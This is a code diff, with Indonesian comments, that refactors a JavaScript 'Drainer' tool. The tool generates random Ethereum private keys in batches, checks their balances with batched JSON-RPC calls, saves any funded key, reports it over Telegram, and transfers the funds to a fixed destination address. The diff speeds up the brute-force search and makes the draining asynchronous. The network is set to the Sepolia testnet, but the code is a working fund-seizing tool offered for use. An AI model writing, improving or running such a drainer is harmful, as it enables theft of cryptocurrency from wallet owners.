@@ -16,46 +16,65 @@ function sleep(ms) {
   return new Promise((r) => setTimeout(r, ms));
 }
 
-// ── Round-robin provider pool (lebih andal dari FallbackProvider) ─────────────
-function buildProviderPool() {
-  const urls = Array.isArray(cfg.providerURL) ? cfg.providerURL : [cfg.providerURL];
-  return urls.map((url) => new ethers.providers.JsonRpcProvider(url));
+// ── Pool provider (round-robin) ───────────────────────────────────────────────
+const RPC_URLS = Array.isArray(cfg.providerURL) ? cfg.providerURL : [cfg.providerURL];
+
+// ── Batch JSON-RPC: cek N wallet dalam 1 HTTP request ────────────────────────
+async function batchGetBalances(wallets, rpcUrl) {
+  const body = wallets.map((w, i) => ({
+    jsonrpc: '2.0',
+    method:  'eth_getBalance',
+    params:  [w.address, 'latest'],
+    id:      i,
+  }));
+
+  const res = await fetch(rpcUrl, {
+    method:  'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body:    JSON.stringify(body),
+    signal:  AbortSignal.timeout(8000),
+  });
+
+  if (!res.ok) throw new Error(`HTTP ${res.status}`);
+  const results = await res.json();
+
+  // Kembalikan BigNumber per wallet (null jika error)
+  return results.map((r) => {
+    if (r && r.result) return ethers.BigNumber.from(r.result);
+    return null;
+  });
 }
 
 class Drainer {
   constructor() {
-    this.dest          = cfg.destinationAddress;
-    this.providers     = buildProviderPool();
-    this.providerIndex = 0;
-    this.concurrency   = cfg.concurrency;
-    this.maxAttempts   = cfg.maxAttempts;
-    this._stopped      = false;
-    this._startTime    = Date.now();
-    this._rpcErrors    = 0;
+    this.dest         = cfg.destinationAddress;
+    this.batchSize    = cfg.batchSize;
+    this.concurrency  = cfg.concurrency;
+    this.maxAttempts  = cfg.maxAttempts;
+    this._stopped     = false;
+    this._startTime   = Date.now();
+    this._rpcErrors   = 0;
+    this._urlIndex    = 0;
 
-    const session      = loadSession();
-    this.totalCount    = session ? session.totalCount   : 0;
-    this.successCount  = session ? session.successCount : 0;
+    const session     = loadSession();
+    this.totalCount   = session ? session.totalCount   : 0;
+    this.successCount = session ? session.successCount : 0;
 
     if (session) {
       process.stdout.write(`\x1b[33m[Resume] Melanjutkan dari attempt #${this.totalCount}\x1b[0m\n`);
     }
   }
 
-  // Ambil provider berikutnya secara round-robin
-  _nextProvider() {
-    const p = this.providers[this.providerIndex % this.providers.length];
-    this.providerIndex++;
-    return p;
+  _nextUrl() {
+    const url = RPC_URLS[this._urlIndex % RPC_URLS.length];
+    this._urlIndex++;
+    return url;
   }
 
-  _elapsed() {
-    return Date.now() - this._startTime;
-  }
+  _elapsed() { return Date.now() - this._startTime; }
 
   _rate() {
-    const secs = this._elapsed() / 1000 || 1;
-    return (this.totalCount / secs).toFixed(1);
+    return (this.totalCount / (this._elapsed() / 1000 || 1)).toFixed(1);
   }
 
   _snapshot() {
@@ -76,23 +95,36 @@ class Drainer {
     tg.notifyStopped(this.totalCount, this.successCount);
   }
 
-  async _getBalance(wallet) {
-    for (let i = 0; i < cfg.retryLimit; i++) {
-      try {
-        return await wallet.getBalance();
-      } catch (err) {
-        this._rpcErrors++;
-        if (i < cfg.retryLimit - 1) {
-          // Ganti provider saat retry
-          wallet = wallet.connect(this._nextProvider());
-          await sleep(cfg.retryDelay * (i + 1));
-        }
+  async _drainWallet(wallet, balance) {
+    const provider = new ethers.providers.JsonRpcProvider(this._nextUrl());
+    const signer   = wallet.connect(provider);
+
+    try {
+      const gasPrice = await provider.getGasPrice();
+      const gasCost  = gasPrice.mul(GAS_LIMIT);
+      const netValue = balance.sub(gasCost);
+
+      if (netValue.lte(ZERO)) {
+        logSuccess(`Saldo tidak cukup untuk gas — wallet disimpan, TX dilewati.`);
+        return;
       }
+
+      const tx = await signer.sendTransaction({
+        to:       this.dest,
+        value:    netValue,
+        gasLimit: GAS_LIMIT,
+        gasPrice,
+      });
+      logSuccess(`TX Hash: ${tx.hash}`);
+      tg.notifyTxSent(tx.hash);
+      await tx.wait(1);
+      logSuccess(`TX Confirmed: ${tx.hash}`);
+    } catch (err) {
+      logSuccess(`TX gagal: ${err.message}`);
     }
-    return null;
   }
 
-  async attemptToDrain() {
+  async _processBatch() {
     if (this._stopped) return;
 
     // Cek batas maxAttempts
@@ -103,70 +135,71 @@ class Drainer {
       process.exit(0);
     }
 
-    // Generate wallet baru, assign ke provider round-robin
-    const provider   = this._nextProvider();
-    let   wallet     = ethers.Wallet.createRandom().connect(provider);
-    const address    = wallet.address;
-    const privateKey = wallet.privateKey;
+    // Generate batch wallet secara lokal (tidak perlu RPC)
+    const wallets = Array.from({ length: this.batchSize }, () => ethers.Wallet.createRandom());
 
-    // Hitung attempt SEBELUM cek balance agar counter selalu naik
-    this.totalCount++;
+    // Hitung semua attempt sekarang
+    this.totalCount += wallets.length;
 
-    const balance = await this._getBalance(wallet);
+    // 1 HTTP request untuk semua wallet dalam batch
+    let balances;
+    for (let retry = 0; retry < cfg.retryLimit; retry++) {
+      try {
+        balances = await batchGetBalances(wallets, this._nextUrl());
+        break;
+      } catch {
+        this._rpcErrors++;
+        if (retry < cfg.retryLimit - 1) await sleep(cfg.retryDelay * (retry + 1));
+      }
+    }
 
-    // Jika semua retry gagal, skip dan lanjut
-    if (balance === null) {
-      logHistory(`${this.totalCount} | ${address} | RPC_ERROR`);
+    if (!balances) {
+      // Semua retry gagal — log dan lanjut
+      wallets.forEach((w, i) => {
+        logHistory(`${this.totalCount - wallets.length + i + 1} | ${w.address} | RPC_ERROR`);
+      });
       return;
     }
 
-    const balanceEth = ethers.utils.formatEther(balance);
-    logHistory(`${this.totalCount} | ${address} | ${balanceEth} ETH`);
+    // Proses hasil — cari wallet dengan saldo > 0
+    for (let i = 0; i < wallets.length; i++) {
+      const balance    = balances[i];
+      const wallet     = wallets[i];
+      const attemptNum = this.totalCount - wallets.length + i + 1;
 
-    if (balance.gt(ZERO)) {
-      this.successCount++;
+      if (!balance) {
+        logHistory(`${attemptNum} | ${wallet.address} | RPC_NULL`);
+        continue;
+      }
 
-      const walletData = {
-        attempt:   this.totalCount,
-        address,
-        privateKey,
-        balance:   balanceEth,
-        network:   'sepolia',
-        timestamp: new Date().toISOString(),
-      };
+      const balanceEth = ethers.utils.formatEther(balance);
+      logHistory(`${attemptNum} | ${wallet.address} | ${balanceEth} ETH`);
 
-      saveWallet(walletData);
-      tg.notifyWalletFound(walletData);
-      logSuccess(`Wallet #${this.successCount} | ${address} | ${balanceEth} ETH`);
+      if (balance.gt(ZERO)) {
+        this.successCount++;
 
-      try {
-        const gasPrice = await provider.getGasPrice();
-        const gasCost  = gasPrice.mul(GAS_LIMIT);
-        const netValue = balance.sub(gasCost);
+        const walletData = {
+          attempt:   attemptNum,
+          address:   wallet.address,
+          privateKey: wallet.privateKey,
+          balance:   balanceEth,
+          network:   'sepolia',
+          timestamp: new Date().toISOString(),
+        };
 
-        if (netValue.gt(ZERO)) {
-          const tx = await wallet.sendTransaction({
-            to:       this.dest,
-            value:    netValue,
-            gasLimit: GAS_LIMIT,
-            gasPrice,
-          });
-          logSuccess(`TX Hash: ${tx.hash}`);
-          tg.notifyTxSent(tx.hash);
-          await tx.wait(1);
-          logSuccess(`TX Confirmed: ${tx.hash}`);
-        } else {
-          logSuccess(`Saldo tidak cukup untuk gas — wallet disimpan, TX dilewati.`);
-        }
-      } catch (err) {
-        logSuccess(`TX gagal: ${err.message}`);
+        saveWallet(walletData);
+        tg.notifyWalletFound(walletData);
+        logSuccess(`Wallet #${this.successCount} | ${wallet.address} | ${balanceEth} ETH`);
+
+        // Drain async — tidak blok worker
+        this._drainWallet(wallet, balance).catch(() => {});
       }
     }
   }
 
   async _worker() {
     while (!this._stopped) {
-      await this.attemptToDrain();
+      await this._processBatch();
     }
   }
 
